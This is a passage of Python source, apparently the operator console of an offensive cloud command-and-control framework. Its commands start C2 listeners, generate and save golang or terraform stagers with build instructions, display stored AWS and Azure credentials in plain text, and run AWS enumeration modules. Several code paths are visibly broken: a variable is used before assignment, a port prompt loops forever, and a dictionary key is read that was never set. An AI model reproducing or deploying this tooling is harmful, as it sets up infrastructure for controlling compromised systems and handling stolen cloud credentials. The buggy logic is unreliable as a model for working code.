                    if len(web_proxies) > 0:
                        print(colored("-------------------------------------",
                                      "yellow"))

                        print("{}".format(
                            colored("Web Proxies", "yellow"),

                        ))
                        print(colored("-------------------------------------",
                                      "yellow"))
                        for wp in web_proxies:
                            print("\t{}".format(
                                colored(wp, "green"),

                            ))
                        print()
                    else:
                        print(colored(
                            "[*] No web-proxies set yet. ","red"
                        ))

                elif command.split(" ")[1] == 'user-agent':
                    print(colored(f"[*] User Agent Set to: {useragent}", "green"))

                elif command.split(" ")[1] == 'current-creds':
                    if curr_creds == None:
                        print(
                            colored("[*] No current creds set", "red")
                        )
                    elif len(curr_creds) > 0:
                        print(colored("-------------------------------------",
                                      "yellow"))

                        print("{}: {}".format(
                            colored("Profile", "yellow"),
                            colored(curr_creds['profile'], "yellow")
                        ))
                        print(colored("-------------------------------------",
                                      "yellow"))

                        for key, value in curr_creds.items():
                            if key == "secret_key":
                                print("\t{}: {}".format(
                                    colored(key, "red"),
                                    colored(f"{value[0]}{(len(value)-2)*'*'}{value[len(value)-1]}", "blue")
                                ))
                            elif key == "session_token":
                                print("\t{}: {}".format(
                                    colored(key, "red"),
                                    colored(f"{value[0]}{(10-2)*'*'}{value[len(value)-1]}", "blue")
                                ))
                            else:
                                print("\t{}: {}".format(
                                    colored(key, "red"),
                                    colored(value, "blue")
                                ))
                        print()

                        del key
                        del value
                    else:
                        print(colored(
                            "[*] No credentials set yet. ","red"
                        ))

                if command.split(" ")[1] == 'credentials':
                    if len(command.split(" ")) == 3:
                        if command.split(" ")[2] == 'plain-text':
                            for sess in all_sessions:
                                print(colored("-------------------------------------",
                                              "yellow"))
                                print("{}: {}".format(
                                    colored("Profile", "yellow"),
                                    colored(sess['profile'], "yellow")
                                ))
                                print(colored("-------------------------------------",
                                              "yellow"))
                                for key, value in sess.items():
                                    print("\t{}: {}".format(
                                        colored(key, "red"),
                                        colored(value, "blue")
                                    ))
                                print()

                            try:
                                del key
                                del value
                            except Exception as e:
                                pass

                    else:
                        for sess in all_sessions:
                            print(colored("-------------------------------------",
                                          "yellow"))
                            print("{}: {}".format(
                                colored("Profile", "yellow"),
                                colored(sess['profile'], "yellow")
                            ))
                            print(colored("-------------------------------------",
                                          "yellow"))
                            for key, value in sess.items():
                                if key in [
                                    "secret_key",
                                    "digitalocean_token",
                                    "session_token",
                                    "azure_access_token",
                                    "azure_id_token",
                                    "azure_refresh_token"
                                ]:
                                    print("\t{}: {}".format(
                                        colored(key, "red"),
                                        colored(f"{value[0]}{(len(value) - 2) * '*'}{value[len(value) - 1]}", "blue")
                                    ))
                                else:
                                    print("\t{}: {}".format(
                                        colored(key, "red"),
                                        colored(f"{value}", "blue")
                                    ))

                            print()

                        try:
                            del key
                            del value
                        except Exception as e:
                            pass

                if command.split(" ")[1] == 'modules':
                    column_width, row_width = os.get_terminal_size(0)
                    #table.max_width = column_width
                    table = prettytable.PrettyTable(max_table_width=column_width, max_width=os.get_terminal_size().columns/2)
                    table.field_names = [colored('Modules', "green"), colored('Description', "green")]

                    '''table._max_width = {
                        'Modules': column_width/2,
                        'Description': column_width/2
                    }'''

                    row_index = 1
                    for m in modules_json:
                        if row_index == 1:
                            row = []
                            row.append(colored(m['amodule'], "blue"))
                            row.append(colored(m['description'], "blue"))
                            table.add_row(row)
                            row = []
                            row.append("")
                            row.append("")
                            table.add_row(row)
                            row_index -= 1

                        elif not row_index == 1:
                            row = []
                            row.append(colored(m['amodule'], "yellow"))
                            row.append(colored(m['description'], "yellow"))
                            table.add_row(row)
                            row = []
                            row.append("")
                            row.append("")
                            row_index += 1
                            table.add_row(row)

                    table.max_width = int(os.get_terminal_size().columns - 60)
                    table.align = 'l'
                    table.set_style(prettytable.DOUBLE_BORDER)
                    print(table)

                if command.split(" ")[1] == 'cosmonauts':
                    user_listed = json.loads(requests.get("{}/api/latest/cosmonauts".format(apihost),
                                                              headers={
                                                                  "Authorization": "Bearer {}".format(jwt_token)}).text)

                    if not "error" in user_listed:
                        print(colored("[*] Cosmonauts: ", "yellow"))
                        print(colored("----------------".format(), "yellow"))
                        for cosmonaut in user_listed['cosmonauts']:
                            print(colored(" > {}".format(cosmonaut), "blue"))
                        print(colored("----------------".format(), "yellow"))
                    else:
                        print(colored("[*] {}".format(user_listed['error']), "red"))

            elif command.split(" ")[0] == 'reset-password':
                if len(command.split(" ")) < 2:
                    print(colored("[*] The correct form should be: reset-password <username>", "red"))

                else:
                    user_passwod = getpass("Password: ").replace("\n", "").strip()
                    if user_passwod == "":
                        print(colored("[*] Password can't be empty", "red"))

                    else:
                        user_json = {
                            "cosmonaut_name": command.split(" ")[1],
                            "cosmonaut_pass": user_passwod
                        }
                        user_created = json.loads(requests.patch("{}/api/latest/cosmonauts".format(apihost),
                                                               json=user_json,
                                                               headers={"Authorization": "Bearer {}".format(
                                                                   jwt_token)}).text)
                        del user_json
                        if not "error" in user_created:
                            print(colored("[*] User '{}' Password's reseted.".format(command.split(" ")[1]), "green"))
                        else:
                            print(colored("[*] {}".format(user_created['error']), "red"))

            elif command.split(" ")[0] == 'http_listener_start':
                listener_name = ""
                if len(command.strip().replace("\n", "").split(" ")) > 1:
                    if not command.strip().replace("\n", "").split(" ")[1] == "":
                        listener_name = command.strip().replace("\n", "").split(" ")[1]
                    else:
                        listener_name_random = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
                        listener_name = input("Give a name to the listener (Default: {}): ".format(listener_name_random))
                        if listener_name.strip().replace("\n", "") == "":
                            listener_name = listener_name_random

                public_ip = requests.get('https://api.ipify.org').text
                listener_host = input("C2 Host ({}): ".format(public_ip))
                if len(listener_host.strip().replace("\n", "")) == 0:
                    listener_host = public_ip

                listener_port_string = input("C2 Port (443): ")
                if listener_port.strip().replace("\n", "") == "":
                    listener_port = 443
                else:
                    i = 0
                    while i == 0:
                        try:
                            listener_port = int(listener_port_string)
                        except Exception as e:
                            listener_port_string = input("Please enter an int for the port: ")


                listener_body = {}
                listener_body['listener_name'] = listener_name
                listener_body['host'] = listener_host
                listener_body['port'] = listener_port
                databaseHost = listener_body['databaseHost']
                databasePort = listener_body['databasePort']
                listener_body['databaseName'] = workspace
                listener_body['listener_protocol'] = "HTTP"

                create_listener = json.loads(requests.get("{}/api/latest/listeners".format(apihost),
                                                      headers={
                                                          "Authorization": "Bearer {}".format(jwt_token)
                                                      }
                                                    ).text)



            elif command.split(" ")[0] == 'exit':
                command = input(
                    colored("Are you sure you want to exit? [y/N] ", "red")
                )
                if command == "Y" or command == "y":
                    exit()

            elif command.split(" ")[0] == 'back':
                terminal = 'Nebula'

            elif command.split(" ")[0] == 'use':
                if len(command.split(" ")) < 3:
                    print(
                        colored("[*] Exact module format is <type>/<name>. Eg: use module enum/s3_list_buckets", "red"))

                elif command.split(" ")[1] == 'particle':
                    if len(command.split(" ")) < 3:
                        print(
                            colored("[*] Also provide the profile name. Eg: use credentials <profilename>",
                                    "red"))
                    else:
                        particle = command.split(" ")[2]

                elif command.split(" ")[1] == 'credentials':
                    if len(command.split(" ")) < 3:
                        print(
                            colored("[*] Also provide the profile name. Eg: use credentials <profilename>",
                                    "red"))
                    else:
                        for cred in all_sessions:
                            c = 0
                            curr_creds = None
                            if command.split(" ")[2] == cred['profile']:
                                cred_prof = command.split(" ")[2]
                                curr_creds = cred
                                print(colored("[*] Currect credential profile set to ", "green") + colored(
                                    "'{}'.".format(cred_prof), "blue") + colored("Use ", "green") + colored(
                                    "'show current-creds' ", "blue") + colored("to check them.", "green"))
                                c = 1
                                cur_creds_name = cred_prof
                                break
                        if c == 0:
                            print(
                                colored(f"[*] Credential \"{command.split(' ')[2]}\" does not exist. Please choose a valid one",
                                        "red"))

                elif command.split(" ")[1] == 'module':
                    if not "/" in command.split(" ")[2]:
                        print(colored("[*] Exact module format is <type>/<name>. Eg: use module enum/s3_list_buckets","red"))
                    else:
                        module = command.split(" ")[2]

                        module_options = json.loads(requests.post("{}/api/latest/modules/use".format(apihost), json={"module": module}, headers = {"Authorization": "Bearer {}".format(jwt_token)}).text)

                        if not "error" in module_options:
                            for c, v in (module_options["module_options"]).items():
                                if c == 'SERVICE':
                                    pass
                                else:
                                    comms['set'][c] = None
                                    comms['unset'][c] = None
                            terminal = module_options['module_name']
                            module_char = module_options['module_name']
                            completer = NestedCompleter.from_nested_dict(comms)
                        else:
                            print(colored("[*] {}".format(module_options['error']), "red"))

            elif command.split(" ")[0] == 'options':
                if module_char == "":
                    print(colored("[*] Choose a module first.","red"))

                else:
                    print (colored("Desctiption:","yellow",attrs=["bold"]))
                    print (colored("-----------------------------","yellow",attrs=["bold"]))
                    print (colored("\t{}".format(module_options['description']),"green"))

                    print(colored("\nAuthor:", "yellow", attrs=["bold"]))
                    print(colored("-----------------------------", "yellow", attrs=["bold"]))
                    for x, y in module_options['author'].items():
                        print("\t{}: {}".format(colored(x, "red"), colored(y, "blue")))

                    print()
                    print("{}: {}".format(colored("Needs Credentials", "yellow", attrs=["bold"]),
                                          colored(module_options['needs_creds'], "green")))
                    print(colored("-----------------------------", "yellow", attrs=["bold"]))

                    print(colored("\nAWSCLI/AzureCLI Command:", "yellow", attrs=["bold"]))
                    print(colored("-----------------------------", "yellow", attrs=["bold"]))
                    cli_comm = module_options['cli_comm']
                    print("\t" + cli_comm)

                    if 'calls' in module_options:
                        print(colored("\nCalls:", "yellow", attrs=["bold"]))
                        print(colored("-----------------------------", "yellow", attrs=["bold"]))
                        for call in module_options['calls']:
                            print("\t" + call)

                    print(colored("\nOptions:", "yellow", attrs=["bold"]))
                    print(colored("-----------------------------","yellow",attrs=["bold"]))


                    print(
                        "\t{}:\t{}\n\t\t{}: {}\n\t\t{}: {}".format(colored("SERVICE", "red"), colored(module_options['module_options']['SERVICE']['value'], "blue"),
                                                                   colored("Required", "yellow"),
                                                                   colored('true', "green"),
                                                                   colored("Description", "yellow"),
                                                                   colored('The service that will be used to run the module. It cannot be changed.', "green")))
                    for key,value in module_options['module_options'].items():
                        if "hidden" in value and value['hidden'] == "true":
                            continue
                        if key == 'SERVICE':
                            pass

                        else:
                            if (value['required']).lower() == "true":
                                print("\t{}:\t{}\n\t\t{}: {}\n\t\t{}: {}".format(colored(key,"red"),colored(value['value'],"blue"),colored("Required","yellow"), colored(value['required'],"green"), colored("Description","yellow"), colored(value['description'],"green")))

                            elif (value['required']).lower() == "false":
                                print("\t{}:\t{}\n\t\t{}: {}\n\t\t{}: {}".format(colored(key,"red"),colored(value['value'],"blue"),colored("Required","yellow"), colored(value['required'],"green"), colored("Description","yellow"), colored(value['description'],"green")))

                            else:
                                print("\t{}:\t{}".format(colored(key, "red"), colored(value['value'], "blue")))
                            print()

            elif command.split(" ")[0] == 'start_c2_listener':
                if len(command.split(" ")) < 3:
                    print(colored("[*] The command format is: start_c2_listener <websocket|http|https> <port>"))
                    print(colored("[*] Example: start_c2_listener websocket 443"))
                if command.split(" ")[1] == 'websocket':
                    try:
                        listener_name_random = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
                        listener_name = input(
                            "Give a name to the listener (Default: {}): ".format(listener_name_random))
                        if listener_name.strip().replace("\n", "") == "":
                            listener_name = listener_name_random

                        listener_port = int(command.split(" ")[2])

                        listener_host = input("C2 Host (Default: 0.0.0.0): ")
                        if listener_host.strip().replace("\n", "") == "" or listener_host.strip().replace("\n", "") == None:
                            listener_host = "0.0.0.0"

                        wsbody = {
                            "listener_name": listener_name,
                            "listener_host": listener_host,
                            "listener_port": listener_port,
                            "listener_protocol": "WebSocket",
                        }
                        start_websocket_listener_text = requests.put("{}/api/latest/listeners".format(apihost),
                                                                  json=wsbody,
                                                                  headers={"Authorization": "Bearer {}".format(
                                                                      jwt_token)}).text

                        print(start_websocket_listener_text)

                        start_websocket_listener_json = json.loads(start_websocket_listener_text)

                        if "error" in start_websocket_listener_json:
                            print(colored("[*] {}".format(start_websocket_listener_json['error']), "red"))

                        else:
                            print(colored("[*] Listener '{}' started on host '{}' and port '{}'".format(
                                listener_name,
                                listener_host,
                                str(listener_port)
                            ), "green"))

                    except ValueError:
                        print(str(e))
                        print(colored("[*] Port should be an integer"))



            elif command.split(" ")[0] == 'run':
                if module_char == "":
                    print(colored("[*] Choose a module first.","red"))

                else:
                    print(
                        colored("[*] The module might take a while. Please wait.", "yellow")
                    )

                    count = 0
                    for key, value in module_options['module_options'].items():
                        if 'choices' in value and not value['value'] in value['choices']:
                            print(colored(f"[*] Option '{key}' can only have the value: {value['choices']}", "red"))
                            count += 1

                        if value['required'] == 'true' and value['value'] == "":
                            print(colored("[*] Option '{}' is not set!".format(key), "red"))
                            count += 1

                    for key, value in module_options['module_options'].items():
                        if 'iswordlist' in value and value['iswordlist'] and not value['value'] == "":
                            if not os.path.exists(value['value']):
                                print(colored("[*] File does not exist. Check the path or name.", "red"))
                                count += 1
                            else:
                                wordlistfile = open(value['value'])
                                wordlistarray = []
                                for line in wordlistfile.readlines():
                                    wordlistarray.append(line.replace("\n", "").strip())

                                value['wordlistvalue'] = wordlistarray

                                del (wordlistfile)
                                del (wordlistarray)

                        if 'isfile' in value and value['isfile'] and not value['value'] == "":
                            if not os.path.exists(value['value']):
                                print(colored("[*] File does not exist. Check the path or name.", "red"))
                                count += 1
                            else:
                                fileobj = open(value['value'])
                                fileContent =  fileobj.read().encode('ascii')
                                value['filevalue'] = base64.b64encode(fileContent)

                                del (fileContent)
                                del (fileobj)


                    if count == 0:
                        if (module_char.split("_")[0]).split("/")[1] == 'aws':
                            if module_options['needs_creds']:
                                if curr_creds is None:
                                    print(
                                        colored(
                                            "[*] Please select a credential", "red", attrs=['bold']
                                        )
                                    )
                                elif curr_creds['provider'] != "AWS":
                                    print(
                                        colored(
                                            "[*] Please select AWS credentials for this module", "red", attrs=['bold']
                                        )
                                    )
                                else:
                                    if len(regions) == 0:
                                        if curr_creds['region'] != "":
                                            regions = [curr_creds['region']]
                                    else:
                                        if len(regions) == 0:
                                            print(
                                                colored("[*] Please select a region, or all", "yellow")
                                            )
                                            i = 0
                                            for printRegion in AWS_REGIONS:
                                                print(
                                                    colored(f"\t[{i}] {printRegion}", "yellow")
                                                )
                                                i += 1

                                            regionSelect = input(
                                                colored(f"Enter numbers 0-{i-1}: ", "yellow")
                                            )
                                            while True:
                                                try:
                                                    if int(regionSelect) >= 0 and int(regionSelect) < i:
                                                        regions.append(AWS_REGIONS[i])
                                                        break
                                                    elif int(regionSelect) == i:
                                                        regions = AWS_REGIONS
                                                    else:
                                                        regionSelect = input(
                                                            colored(f"Enter numbers 0-{i-1}: ", "yellow")
                                                        )
                                                except ValueError:
                                                    regionSelect = input(
                                                        colored(f"Enter numbers 0-{i-1}: ", "yellow")
                                                    )

                                module_output = {}
                                for AWSregion in regions:
                                    if len(regions) == 0:
                                        print(colored('[*] Select one or several (split by comma) regions using "set default-regions <region>" or use All with ""set default-regions All""', "red"))
                                    else:
                                        print(colored(f'[*] Running module "{module_char}" on region "{AWSregion}".', "yellow"))

                                        for iamuser in all_sessions:
                                            if iamuser['profile'] == cred_prof:
                                                iamuser['region'] = AWSregion

                                                module_output[AWSregion] = RunModule(module_char, module_options, cred_prof, useragent, workspace, web_proxies, jwt_token, apihost, username, AWSregion)


                                                #if module_char.split("/")[0] == "stager" or module_char.split("/")[0] == "listeners":
                                                if module_char.split("/")[0] == "listeners":
                                                    if not "error" in module_output[AWSregion]:
                                                        if 'OutPutFile' in module_output[AWSregion]:
                                                            if not os.path.exists(".stagers"):
                                                                os.makedirs(".stagers")

                                                            try:
                                                                if module_options['module_options']['STAGER-TYPE'] == "terraform":
                                                                    with open(
                                                                            f".stagers/{AWSregion}_{module_output[AWSregion]['OutPutFile']}",
                                                                            'w') as stagerfile:
                                                                        stagerfile.write(base64.b64decode(
                                                                            module_output[AWSregion]['Code']).decode())
                                                                        stagerfile.close()
                                                                    del (module_output[AWSregion]['Code'])
                                                                    module_output[AWSregion]['OutPutFile'] = f".stagers/{AWSregion}_{module_output[AWSregion]['OutPutFile']}",
                                                                elif module_options['module_options']['STAGER-TYPE'] == "golang":
                                                                    with open(
                                                                            f".stagers/{AWSregion}_{module_output[AWSregion]['OutPutFile']}.go",
                                                                            "w") as gofile:
                                                                        gofile.write(base64.b64decode(
                                                                            module_output[AWSregion]['Code']).decode())
                                                                        gofile.close()
                                                                    currdir = os.getcwd()
                                                                    os.chdir(".stagers/")
                                                                    goos = module_output['GOOS']
                                                                    goarch = module_output['GOARCH']

                                                                    os.popen(
                                                                        f"go mod init golangs3stager; go mod tidy; GOOS={goos} GOARCH={goarch} go build -o {AWSregion}_{module_output[AWSregion]['OutPutFile']}")
                                                                    os.chdir(currdir)
                                                                    os.remove(
                                                                        "./go.mod")
                                                                    os.remove(
                                                                        "./go.sum")
                                                                    os.remove(
                                                                        f"{AWSregion}_{module_output[AWSregion]['OutPutFile']}")
                                                                    os.remove(
                                                                        f"{AWSregion}_{module_output[AWSregion]['OutPutFile']}.go")
                                                                    del (module_output[AWSregion]['Code'])
                                                                    module_output[AWSregion][
                                                                        'OutPutFile'] = f".stagers/{AWSregion}_{module_output[AWSregion]['OutPutFile']}",
                                                                #PrintAWSModule(module_output)
                                                            except FileNotFoundError:
                                                                print(
                                                                    colored(
                                                                        "Please, only put the file name that will be stored on directory '.stagers'",
                                                                        "red")
                                                            )
                                                        #else:
                                                        #    PrintAWSModule(module_output)

                                                #else:
                                                #    PrintAWSModule(module_output)


                                                #else:
                                PrintAWSModule(module_output)

                                                #PrintAWSModule(module_output)


                            else:
                                module_output = RunModule(
                                    module_char,
                                    module_options,
                                    cred_prof,
                                    useragent,
                                    workspace,
                                    web_proxies,
                                    jwt_token,
                                    apihost,
                                    username,
                                    None
                                )

                                if module_char.split("/")[0] == "stager" or module_char.split("/")[0] == "listeners":
                                    if not "error" in module_output:
                                        if 'ModuleName' in module_output and "OutPutFile" in module_output['ModuleName']:
                                            if not os.path.exists(".stagers"):
                                                os.makedirs(".stagers")

                                            try:
                                                if module_char.split("_")[-1] == "terraform":
                                                    with open(
                                                            f".stagers/{module_output['ModuleName']['OutPutFile']}",
                                                            'w') as stagerfile:
                                                        stagerfile.write(base64.b64decode(
                                                            module_output['ModuleName']['Code']).decode())
                                                        stagerfile.close()
                                                    del (module_output['ModuleName']['Code'])
                                                    module_output['ModuleName'][
                                                        'OutPutFile'] = f".stagers/{module_output['ModuleName']['OutPutFile']}",

                                                elif module_char.split("_")[-1] == "golang":
                                                    if not os.path.exists(f".stagers/{module_output['ModuleName']['OutPutFile']}"):
                                                        os.mkdir(f".stagers/{module_output['ModuleName']['OutPutFile']}")


                                                    with open(f".stagers/{module_output['ModuleName']['OutPutFile']}/{module_output['ModuleName']['OutPutFile']}.go", "w") as gofile:
                                                        gofile.write(base64.b64decode(module_output['ModuleName']['Code']).decode())
                                                        gofile.close()

                                                    goos = module_options['module_options']['GOOS']['value']
                                                    goarch = module_options['module_options']['GOARCH']['value']
                                                    '''
                                                    try:
                                                        client = docker.from_env()
                                                        client.images.pull('golang:latest')

                                                        client.containers.run(
                                                            'golang:latest', f"cd /stagers; GOOS={goos} GOARCH={goarch}; go mod init golangs3stager; go mod tidy; go build -o {module_output['ModuleName']['OutPutFile']}",
                                                            volumes={
                                                                f"{os.getcwd()}/.stagers/{module_output['ModuleName']['OutPutFile']}": {
                                                                    'bind': "/stagers",
                                                                    'mode': 'rw'
                                                                }
                                                            },
                                                            detach=True
                                                        )
                                                    except Exception as e:
                                                        print(
                                                            colored(f"[*] {str(e)}", "red")
                                                        )
                                                    '''
                                                    #currdir = os.getcwd()
                                                    #os.chdir(f".stagers/{module_output['ModuleName']['OutPutFile']}")

                                                    #goos = module_options['module_options']['GOOS']['value']
                                                    #goarch = module_options['module_options']['GOARCH']['value']
                                                    #print(f"GOOS={goos}; export GOARCH={goarch}; go mod init golangs3stager; go mod tidy; go build -o {module_output['ModuleName']['OutPutFile']}")
                                                    #print(os.popen(f"export GOROOT=$(go env | grep GOROOT | cut -d \"'\" -f 2); export GOOS={goos}; export GOARCH={goarch}; go mod init golangs3stager; go mod tidy; go build -o {module_output['ModuleName']['OutPutFile']}").read())
                                                    #os.chdir(currdir)

                                                    # os.remove("./go.mod")
                                                    # os.remove("./go.sum")
                                                    # os.remove(f"{module_output['OutPutFile']}.go")

                                                    del (module_output['ModuleName']['Code'])

                                                    module_output['ModuleName']["Instructions"] = f"To build the binary, run: 'go mod init golangs3stager; go mod tidy; GOOS={goos} GOARCH={goarch} go build -o {module_output['ModuleName']['OutPutFile']}' inside directory .stagers/{module_output['ModuleName']['OutPutFile']} on another terminal"
                                                    module_output['ModuleName'][
                                                        'OutPutFile'] = f".stagers/{module_output['ModuleName']['OutPutFile']}/{module_output['ModuleName']['OutPutFile']}.go",

                                                PrintAWSModule(module_output)
                                            except FileNotFoundError:
                                                print(
                                                    colored(
                                                        "Please, only put the file name that will be stored on directory '.stagers'",
                                                        "red")
                                                )
                                        else:
                                            PrintAWSModule(module_output)
                                    else:
                                        PrintAWSModule(module_output)

                                else:
                                    PrintAWSModule(module_output)
                        else:
                            module_output = RunModule(module_char, module_options, cred_prof, useragent, workspace, web_proxies, jwt_token, apihost, username, "")
                            PrintAWSModule(module_output)

            elif command.split(" ")[0] == 'get_domain':
                if len(command.split(" ")) < 2:
                    print(colored("[*] Please provide a domain too. ", "red"))
                else:
                    get_domains_dict = get_domains(apihost, (command.split(" ")[1]).strip().replace("\n", ""), jwt_token)
                    if "error" in get_domains_dict:
                        print(colored("[*] {}".format(get_domains_dict['error']), "red"))

                    else:
                        from pygments import highlight
                        from pygments.lexers import JsonLexer
                        from pygments.formatters import TerminalFormatter
                        for title_name, json_data in get_domains_dict.items():
                            if isinstance(json_data, list):
                                output += colored(
                                    "------------------------------------------------------------------\n",
                                    "yellow", attrs=['bold'])
                                for data in json_data:
                                    output += colored(
                                        "{}: {}\n".format(title_name, data[title_name]),
                                        "yellow", attrs=['bold'])
                                    output += colored(
                                        "------------------------------------------------------------------\n",
                                        "yellow", attrs=['bold'])
                                    raw_json = json.dumps(data, indent=4)
                                    output += highlight(
                                        raw_json,
                                        JsonLexer(),
                                        TerminalFormatter()
                                    )

                                    # Print to console

                                    output += colored(
                                        "------------------------------------------------------------------\n",
                                        "yellow",
                                        attrs=['bold'])

            elif command.split(" ")[0] == 'get_aws_s3_bucket':
                if len(command.split(" ")) < 2:
                    print(colored("[*] Please provide a username too. ", "red"))
                else:
                    get_aws_s3_bucket_dict = get_aws_s3_bucket(apihost, (command.split(" ")[1]).strip().replace("\n", ""), jwt_token)
                    if "error" in get_aws_s3_bucket_dict:
                        print(colored("[*] {}".format(get_aws_s3_bucket_dict['error']), "red"))

                    else:
                        from pygments import highlight
                        from pygments.lexers import JsonLexer
                        from pygments.formatters import TerminalFormatter
                        for title_name, json_data in get_aws_s3_bucket_dict.items():
                            if isinstance(json_data, list):
                                output += colored(
                                    "------------------------------------------------------------------\n",
                                    "yellow", attrs=['bold'])
                                for data in json_data:
                                    output += colored(
                                        "{}: {}\n".format(title_name, data[title_name]),
                                        "yellow", attrs=['bold'])
                                    output += colored(
                                        "------------------------------------------------------------------\n",
                                        "yellow", attrs=['bold'])
                                    raw_json = json.dumps(data, indent=4)
                                    output += highlight(
                                        raw_json,
                                        JsonLexer(),
                                        TerminalFormatter()
                                    )

                                    # Print to console

                                    output += colored(
                                        "------------------------------------------------------------------\n",
                                        "yellow",
                                        attrs=['bold'])

            elif command.split(" ")[0] == 'get_aws_iam_user':
                if len(command.split(" ")) < 2:
                    print(colored("[*] Please provide a username too. ", "red"))
                else:
                    get_iam_user_dict = get_aws_iam_user(apihost, (command.split(" ")[1]).strip().replace("\n", ""), jwt_token)
                    if "error" in get_iam_user_dict:
                        print(colored("[*] {}".format(get_iam_user_dict['error']), "red"))

                    else:
                        from pygments import highlight
                        from pygments.lexers import JsonLexer
                        from pygments.formatters import TerminalFormatter
                        for title_name, json_data in get_iam_user_dict.items():
                            if isinstance(json_data, list):
                                output += colored(
                                    "------------------------------------------------------------------\n",
                                    "yellow", attrs=['bold'])
                                for data in json_data:
                                    output += colored(
                                        "{}: {}\n".format(title_name, data[title_name]),
                                        "yellow", attrs=['bold'])
                                    output += colored(
                                        "------------------------------------------------------------------\n",
                                        "yellow", attrs=['bold'])
                                    raw_json = json.dumps(data, indent=4)
                                    output += highlight(
                                        raw_json,
                                        JsonLexer(),
                                        TerminalFormatter()
                                    )

                                    # Print to console

                                    output += colored(
                                        "------------------------------------------------------------------\n",
                                        "yellow",
                                        attrs=['bold'])
                            else:
                                output += colored(
                                    "------------------------------------------------------------------\n",
                                    "yellow", attrs=['bold'])
                                output += colored(
                                    "{}: {}\n".format(title_name, json_data[title_name]),
                                    "yellow", attrs=['bold'])
                                output += colored(
                                    "------------------------------------------------------------------\n",
                                    "yellow", attrs=['bold'])
                                raw_json = json.dumps(json_data, indent=4)
                                output += highlight(
                                    raw_json,
                                    JsonLexer(),
                                    TerminalFormatter()

                                )
                                # TerminalFormatter()
                                output += colored(
                                    "------------------------------------------------------------------\n",
                                    "yellow", attrs=['bold'])
                            pipepager(output, cmd='less -FR')
                            print(output)
                            output = ""

            elif command.split(" ")[0] == 'list_domains':
                list_domains_dict = list_domains(apihost, jwt_token)

                if "error" in list_domains_dict:
                    print(colored("[*] {}".format(list_domains_dict['error']), "red"))

                else:
                    from pygments import highlight
                    from pygments.lexers import JsonLexer
                    from pygments.formatters import TerminalFormatter
                    for title_name, json_data in list_domains_dict.items():
                        if isinstance(json_data, list):
                            output += colored("------------------------------------------------------------------\n",
                                              "yellow", attrs=['bold'])
                            for data in json_data:
                                output += colored(
                                    "{}: {}\n".format(title_name, data[title_name]),
                                    "yellow", attrs=['bold'])
                                output += colored(
                                    "------------------------------------------------------------------\n",
                                    "yellow", attrs=['bold'])
                                raw_json = json.dumps(data, indent=4)
                                output += highlight(
                                    raw_json,
                                    JsonLexer(),
                                    TerminalFormatter()
                                )

                                # Print to console

                                output += colored(
                                    "------------------------------------------------------------------\n",
                                    "yellow",
                                    attrs=['bold'])
                        else:
                            output += colored("------------------------------------------------------------------\n",
                                              "yellow", attrs=['bold'])
                            output += colored(
                                "{}: {}\n".format(title_name, json_data[title_name]),
                                "yellow", attrs=['bold'])
                            output += colored("------------------------------------------------------------------\n",
                                              "yellow", attrs=['bold'])
                            raw_json = json.dumps(json_data, indent=4)
                            output += highlight(
                                raw_json,
                                JsonLexer(),
                                TerminalFormatter()

                            )
                            # TerminalFormatter()
                            output += colored("------------------------------------------------------------------\n",
                                              "yellow", attrs=['bold'])
                        pipepager(output, cmd='less -FR')
                        print(output)
                        output = ""

            elif command.split(" ")[0] == 'list_aws_s3_buckets':
                list_aws_s3_buckets_dict = list_aws_s3_buckets(apihost, jwt_token)

                if "error" in list_aws_s3_buckets_dict:
                    print(colored("[*] {}".format(list_aws_s3_buckets_dict['error']), "red"))

                else:
                    from pygments import highlight
                    from pygments.lexers import JsonLexer
                    from pygments.formatters import TerminalFormatter
                    for title_name, json_data in list_aws_s3_buckets_dict.items():
                        if isinstance(json_data, list):
                            output += colored("------------------------------------------------------------------\n",
                                              "yellow", attrs=['bold'])
                            for data in json_data:
                                output += colored(
                                    "{}: {}\n".format(title_name, data[title_name]),
                                    "yellow", attrs=['bold'])
                                output += colored(
                                    "------------------------------------------------------------------\n",
                                    "yellow", attrs=['bold'])
                                raw_json = json.dumps(data, indent=4)
                                output += highlight(
                                    raw_json,
                                    JsonLexer(),
                                    TerminalFormatter()
                                )

                                # Print to console

                                output += colored(
                                    "------------------------------------------------------------------\n",
                                    "yellow",
                                    attrs=['bold'])
                        else:
                            output += colored("------------------------------------------------------------------\n",
                                              "yellow", attrs=['bold'])
                            output += colored(
                                "{}: {}\n".format(title_name, json_data[title_name]),
                                "yellow", attrs=['bold'])
                            output += colored("------------------------------------------------------------------\n",
                                              "yellow", attrs=['bold'])
                            raw_json = json.dumps(json_data, indent=4)
                            output += highlight(
                                raw_json,
                                JsonLexer(),
                                TerminalFormatter()

                            )
                            # TerminalFormatter()
                            output += colored("------------------------------------------------------------------\n",
                                              "yellow", attrs=['bold'])
                        pipepager(output, cmd='less -FR')
                        print(output)
                        output = ""

            elif command.split(" ")[0] == 'list_aws_iam_users':
                list_iam_users_dict = list_aws_iam_users(apihost, jwt_token)

                if "error" in list_iam_users_dict:
                    print(colored("[*] {}".format(list_iam_users_dict['error']), "red"))

                else:
                    from pygments import highlight
                    from pygments.lexers import JsonLexer
                    from pygments.formatters import TerminalFormatter

                    for title_name, json_data in list_iam_users_dict.items():
                        if isinstance(json_data, list):
                            output += colored("------------------------------------------------------------------\n",
                                              "yellow", attrs=['bold'])
                            for data in json_data:
                                output += colored(
                                    "{}: {}\n".format(title_name, data[title_name]),
                                    "yellow", attrs=['bold'])
                                output += colored(
                                    "------------------------------------------------------------------\n",
                                    "yellow", attrs=['bold'])
                                raw_json = json.dumps(data, indent=4)
                                output += highlight(
                                    raw_json,
                                    JsonLexer(),
                                    TerminalFormatter()
                                )

                                # Print to console

                                output += colored(
                                    "------------------------------------------------------------------\n",
                                    "yellow",
                                    attrs=['bold'])
                        else:
                            output += colored("------------------------------------------------------------------\n",
                                              "yellow", attrs=['bold'])
                            output += colored(
                                "{}: {}\n".format(title_name, json_data[title_name]),
                                "yellow", attrs=['bold'])
                            output += colored("------------------------------------------------------------------\n",
                                              "yellow", attrs=['bold'])
                            raw_json = json.dumps(json_data, indent=4)
                            output += highlight(
                                raw_json,
                                JsonLexer(),
                                TerminalFormatter()

                            )
                            # TerminalFormatter()
                            output += colored("------------------------------------------------------------------\n",
                                              "yellow", attrs=['bold'])
                        pipepager(output, cmd='less -FR')
                        print(output)
                        output = ""

            elif command.split(" ")[0] == 'shell':
                if particle == "":
